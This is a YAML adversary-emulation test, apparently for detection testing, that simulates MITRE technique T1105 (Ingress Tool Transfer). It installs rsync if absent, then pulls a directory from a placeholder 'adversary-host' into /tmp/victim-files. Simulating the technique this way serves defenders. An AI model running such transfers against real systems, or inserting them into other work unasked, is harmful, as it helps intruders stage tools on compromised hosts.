api_version: "2.0"
name: rsync remote file copy (pull)
description: |
    Utilize rsync to perform a remote file copy (pull)
args:
    - name: remote_path
      type: path
      default: /tmp/adversary-rsync/
    - name: remote_host
      type: string
      default: adversary-host
    - name: local_path
      type: path
      default: /tmp/victim-files
    - name: username
      type: string
      default: adversary
uuid: 3180f7d5-52c0-4493-9ea0-e3431a84773f
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1105: Ingress Tool Transfer'
requirements:
    platforms:
        - os: linux
        - os: darwin
steps:
    - name: "rsync must be installed on the machine \n"
      inline: |
        if [ -x "$(command -v rsync)" ]; then exit 0; else {(pkg install -y rsync)||(sudo apt-get -y install rsync)
        }; fi
      executor: sh
    - name: rsync-remote-file-copy-(pull)
      inline: |
        rsync -r {{.Args.username}}@{{.Args.remote_host}}:{{.Args.remote_path}} {{.Args.local_path}}
      executor: sh
      cleanup:
        inline: ""
        executor: sh
